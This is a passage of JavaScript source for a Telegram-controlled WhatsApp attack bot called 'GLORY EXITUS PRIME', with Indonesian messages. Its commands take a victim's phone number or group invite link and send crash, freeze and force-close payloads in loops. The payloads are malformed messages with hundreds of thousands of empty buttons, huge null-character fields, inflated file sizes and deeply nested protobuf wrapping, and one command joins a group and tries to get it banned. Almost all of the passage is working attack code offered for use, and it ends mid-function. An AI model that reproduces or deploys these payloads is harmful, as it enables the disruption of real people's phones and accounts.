    if (!link) return null;
    const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
    return match ? match[1] : null;
}

// Command with middleware
bot.command('bangc', checkWhatsAppConnection, checkAccess, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xprime")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

    const chatId = ctx.chat.id; 
    const senderId = ctx.from.id;
    const date = getCurrentDate(); 
    const commandText = ctx.message.text || '';
    const parts = commandText.split(' ');
    const link = parts.length > 1 ? parts.slice(1).join(' ') : null;
    
    if (!link) {
        return ctx.reply(
            `🪧 *Format:* /bangc https://chat.whatsapp.com/xxxxxx`,
            { parse_mode: "Markdown" }
        );
    }
    
    const inviteCode = extractInviteCode(link);
    
    if (!inviteCode) {
        return ctx.reply(
            `❌ *Link tidak valid!* Pastikan link undangan grup WhatsApp.`,
            { parse_mode: "Markdown" }
        );
    }
    
    const thumbnailURL = "https://f.top4top.io/p_3895jrbb71.jpg";
    
    // Send initial processing message as PHOTO
    const processMessage = await ctx.replyWithPhoto(thumbnailURL, {
        caption: `
<blockquote><pre>▾ ▾ ⿻♰ 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 ♰ ▾  </pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>🔄 Processing... (Join Grup)</b>
`,
        parse_mode: "HTML"
    });
    
    const processMsgId = processMessage.message_id;
    
    try {
        const target = await sock.groupAcceptInvite(inviteCode);
        
        if (!target) {
            throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
        }
        
        console.log(`✅ Berhasil join grup: ${target}`);
        
        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            null,
            `
<blockquote><pre>▾ ⿻♰ 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 ♰ ▾ </pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Join Berhasil! ID: ${target}</b>
`,
            { parse_mode: "HTML" }
        );
        
        // CALL BanGroup
        await BanGroup(target);
        
        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            null,
            `
<blockquote><pre>▾ ⿻♰ 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 ♰ ▾ </pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Success! The group has been successfully banned.</b>
`,
            { parse_mode: "HTML" }
        );
        
    } catch (err) {
        console.error(`❌ Gagal: ${err.message}`);
        
        let errorMsg = err.message;
        
        if (errorMsg.includes("already") || errorMsg.includes("exist")) {
            errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
        } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
            errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
        } else if (errorMsg.includes("not-authorized")) {
            errorMsg = "Bot tidak memiliki izin (bukan admin) untuk melakukan aksi ini.";
        }
        
        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            null,
            `
<blockquote><pre>▾ ⿻♰ 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 ♰ ▾ </pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>❌ Gagal: ${errorMsg}</b>
`,
            { parse_mode: "HTML" }
        );
    }
});
 
// ======== PEMANGGILAN FUNCTION ====== //
bot.command("xlevel",
  checkWhatsAppConnection,
  checkAccess,
  checkCooldown,

  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Format: /xlevel 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithPhoto("https://f.top4top.io/p_3895jrbb71.jpg", {
      caption: `
<blockquote>⬡═―—⊱ GLORY EXITUS PRIME ⊰―—═⬡
⌑ Target: ${q}
⌑ Pilih type bug:</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "DELAY HARD INVISIBLE", callback_data: `xlevel_type_delay_${q}` },
            { text: "BLANK DEVICE", callback_data: `xlevel_type_blank_${q}` },
          ],
          [
            { text: "CRASH OR FC", callback_data: `xlevel_type_fc_${q}` },
          ]
        ]
      }
    });
  }
);

// Handler semua callback
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (!data.startsWith("xlevel_")) return;

  const parts = data.split("_");
  const action = parts[1]; // type / level
  const type = parts[2];
  const q = parts[3];
  const level = parts[4];
  const target = q + "@s.whatsapp.net";
  const chatId = ctx.chat.id;
  const messageId = ctx.callbackQuery.message.message_id;

  // === Tahap 1: pilih tipe → tampilkan pilihan level ===
  if (action === "type") {
    return ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `
<blockquote>⬡═―—⊱ GLORY EXITUS PRIME ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Pilih level bug:</blockquote>
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "(Low)", callback_data: `xlevel_level_${type}_${q}_low` },
              { text: "(Medium)", callback_data: `xlevel_level_${type}_${q}_medium` },
            ],
            [
              { text: "(Hard)", callback_data: `xlevel_level_${type}_${q}_hard` },
            ],
            [
              { text: "⬅️ Kembali", callback_data: `xlevel_back_${q}` }
            ]
          ]
        }
      }
    );
  }

  // === Tombol kembali ke pilihan awal ===
  if (action === "back") {
    return ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `
<blockquote>⬡═―—⊱ GLORY EXITUS PRIME ⊰―—═⬡
⌑ Target: ${q}
⌑ Pilih type bug:</blockquote>
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "DELAY HARD INVISIBLE", callback_data: `xlevel_type_delay_${q}` },
              { text: "BLANK DEVICE", callback_data: `xlevel_type_blank_${q}` },
            ],
            [
              { text: "CRASH OR FC", callback_data: `xlevel_type_fc_${q}` },
            ]
          ]
        }
      }
    );
  }

  // === Tahap 2: pilih level → mulai animasi & eksekusi bug ===
  if (action === "level") {
    await ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `
<blockquote>⬡═―—⊱ GLORY EXITUS PRIME ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ⏳ Processing</blockquote>
`,
      { parse_mode: "HTML" }
    );

    const frames = [
      "▰▱▱▱▱▱▱▱▱▱ 10%",
      "▰▰▱▱▱▱▱▱▱▱ 20%",
      "▰▰▰▱▱▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱▱▱ 40%",
      "▰▰▰▰▰▱▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱▱▱ 60%",
      "▰▰▰▰▰▰▰▱▱▱ 70%",
      "▰▰▰▰▰▰▰▰▱▱ 80%",
      "▰▰▰▰▰▰▰▰▰▱ 90%",
      "▰▰▰▰▰▰▰▰▰▰ 100%"
    ];

    for (const f of frames) {
      await ctx.telegram.editMessageCaption(
        chatId,
        messageId,
        undefined,
        `
<blockquote>⬡═―—⊱ GLORY EXITUS PRIME ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ${f}</blockquote>
`,
        { parse_mode: "HTML" }
      );
      await new Promise((r) => setTimeout(r, 400));
    }

    // === Eksekusi sesuai type & level ===
    if (type === "blank") {
      const count = level === "low" ? 10 : level === "medium" ? 30 : 50;
      for (let i = 0; i < count; i++) {
        await FreezebyRafi(sock, target); 
        await mpruy(sock, target); 
        await sleep(1500);
      }
    } else if (type === "delay") {
      const loops = level === "low" ? 5 : level === "medium" ? 20 : 35;
      for (let i = 0; i < loops; i++) {
        await Frezeesimple(sock, target); 
        await sleep(400);
        await delayxfrezeenewV2(sock, target);
        await sleep(400);
      }
    } else if (type === "fc") {
      const count = level === "low" ? 1 : level === "medium" ? 5 : 10;
      for (let i = 0; i < count; i++) {
        await ForceloseNew6(sock, target);
        await sleep(300);
      }
    }

    // === Setelah selesai ===
    await ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `
<blockquote>⬡═―—⊱ GLORY EXITUS PRIME ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ✅ Sukses</blockquote>
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ Cek Target", url: `https://wa.me/${q}` }],
            [{ text: "🔁 Kirim Lagi", callback_data: `xlevel_type_${type}_${q}` }]
          ],
        },
      }
    );

    await ctx.answerCbQuery(`Bug ${type.toUpperCase()} (${level.toUpperCase()}) selesai ✅`);
  }
});


bot.command("xfreeze", checkWhatsAppConnection, checkAccess, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xfreeze")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xfreeze 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』
⸙ 𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗙𝗥𝗘𝗘𝗭𝗘 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘
♛ 𝗧𝗮𝗿𝗴𝗲𝘁: ${q}
♛ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗦𝘂𝗰𝗰𝗲𝘀 𝗗𝗶𝗸𝗶𝗿𝗶𝗺 </blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  for (let i = 0; i < 6; i++) {
    await VnXUnciodeNoClick(sock, target);
    await sleep(4000); 
  }
});

bot.command("forceclose", checkWhatsAppConnection, checkAccess, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("forceclose")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forceclose 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』
⸙ 𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗙𝗢𝗥𝗖𝗘𝗖𝗟𝗢𝗦𝗘 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣
♛ 𝗧𝗮𝗿𝗴𝗲𝘁: ${q}
♛ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗦𝘂𝗰𝗰𝗲𝘀 𝗗𝗶𝗸𝗶𝗿𝗶𝗺 </blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  for (let i = 0; i < 1; i++) {
    await TheAnomoyusForcloseUltra(sock, target);
    await sleep(4000); 
  }
});





bot.command("xfc", checkWhatsAppConnection, checkAccess, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xfc")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xfc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』
⸙ 𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗙𝗢𝗥𝗖𝗘𝗖𝗟𝗢𝗦𝗘 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝟮𝟰 𝗝𝗔𝗠
♛ 𝗧𝗮𝗿𝗴𝗲𝘁: ${q}
♛ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗦𝘂𝗰𝗰𝗲𝘀 𝗗𝗶𝗸𝗶𝗿𝗶𝗺 </blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  for (let i = 0; i < 50; i++) {
    await ForcloseDOC(sock, target);
    await TheAnomoyusForcloseUltra(sock, target);
    await sleep(300000); 
  }
});
 
 
 
 
  
bot.command("xprime", checkWhatsAppConnection, checkAccess, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xprime")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xprime 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』
⸙ 𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗕𝗟𝗔𝗡𝗞 𝗡𝗢 𝗞𝗟𝗜𝗞 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘
♛ 𝗧𝗮𝗿𝗴𝗲𝘁: ${q}
♛ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗦𝘂𝗰𝗰𝗲𝘀 𝗗𝗶𝗸𝗶𝗿𝗶𝗺 </blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  for (let i = 0; i < 40; i++) {
    await CrashDelay(sock, target);
    await VnXUnciodeNoClick(sock, target);
    await sleep(6000); 
  }
}); 
 
 
 
// ===== Func Lu Taro Sini ===== //
//FUNCTION FREEZE INVISIBLE \\
async function CrashDelay(sock, target) {
    const CrashAmsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𖤐 𝐀𝐦𝐛𝐚𝐉𝐚𝐡𝐚𝐭 ᭄",
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/pdf",
                            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
                            fileLength: 999999999,
                            pageCount: 1000,
                            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
                            fileName: "vixzzofc.PDF",
                            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
                            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1779839963",
                            thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
                            thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
                            thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
                            jpegThumbnail: null,
                            contextInfo: {},
                            thumbnailHeight: 999,
                            thumbnailWidth: 999
                        }
                    },
                    body: {
                        text: "AmbaJahat",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 9999,
                                expectedVideoCount: 9999
                            }
                        },
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, CrashAmsg, { noSelfSync: true });
}


async function VnXUnciodeNoClick(sock, target) {
  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0&mms3=true",
                directPath: "/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0",
                mimetype: "video/mp4",
                mediaKey: "wv/atWfl21qU9enzJBV5pfE2OU1/ouIFO5QuRQp5Heg=",
                fileEncSha256: "P0Mc91Qhpus26uHe9iGnIfCBqOTPoaPpg3mInV2NVKk=",
                fileSha256: "yYiWMdXM82iuxVc/vTKzQ7jZMc/jgtTe+KmwGYt4hpc=",
                fileLength: "87906632",
                mediaKeyTimestamp: "1778075081",
                jpegThumbnail: null,
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
              },
              hasMediaAttachment: true
            },
            body: {
              text: "VnX Nih" + TAGS,
              format: "DEFAULT"
            },
            footer: {
              text: "By @Raffioffci5",
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 300000 }, () => ({})),
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                display_text: "\0".repeat(99999),
                id: "\u200B".repeat(99999),
                flow_token: "\n".repeat(99999),
              })
            },
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, { noSelfSync: true });
    console.log("Error Woy" + target);
  } catch (err) {
    console.error("Error sending to" + target + ":", err);
  }
}
///function fc
async function ForcloseDOC(sock, target) {
  const document = {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "nando.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
};
   
    const tol = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(rb) {
        var buf = [];
        while (rb >= 0x80) {
            buf.push((rb & 0x7f) | 0x80);
            rb >>>= 7;
        }
        buf.push(rb);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const MakLo = proto.Message.encode(
        proto.Message.fromObject({ documentMessage: document })
    ).finish();

    const inflate = function(tag, rayap) {
        var buf = MakLo;
        for (var i = 0; i < rayap; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    var MAX_BATCH = 100;
    var DELAY_MS  = 2000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var crb   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var CrBMsG  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < tol.length; ti++) {
            var tag     = tol[ti];
            var bokep = null;

            for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, rayap));
                    proto.Message.encode(decoded).finish();
                    bokep = decoded;
                } catch (_) {}
            }

            if (!bokep) continue;

            await sock.relayMessage('status@broadcast', bokep, {
                messageId: CrBMsG,
                statusJidList: crb,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: crb.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}



async function TheAnomoyusForcloseUltra(sock, target) {
    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('No valid JIDs');

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(basePayload, tag, depth) {
        let buf = basePayload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const getDecodedPayload = function(basePayload, tag) {
        let payload = null;
        for (let depth = 5000; depth >= 2000 && !payload; depth -= 500) {
            try {
                const decoded = proto.Message.decode(inflate(basePayload, tag, depth));
                proto.Message.encode(decoded).finish();
                payload = decoded;
            } catch (_) {}
        }
        return payload;
    };

    const albumData = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1"
    };

    const albumPayload = {
        albumMessage: {
            stickerMessage: {
                ...albumData,
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                mimetype: "image/webp",
                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                fileLength: "10610",
                mediaKeyTimestamp: "1775044724",
                stickerSentTs: "1775044724091"
            },
            contextInfo: {
                quotedMessage: {
                    stickerMessage: {
                        ...albumData,
                        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                        mimetype: "image/webp",
                        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                        fileLength: "10610",
                        mediaKeyTimestamp: "1775044724",
                        stickerSentTs: "1775044724091"
                    }
                }
            }
        }
    };

    const docPayload = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: 999999999,
            pageCount: 0x9184e729fff,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: "NtahMengapa..",
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1715880173",
            contactVcard: true
        }
    };

    const statusPayload = {
        imageMessage: {
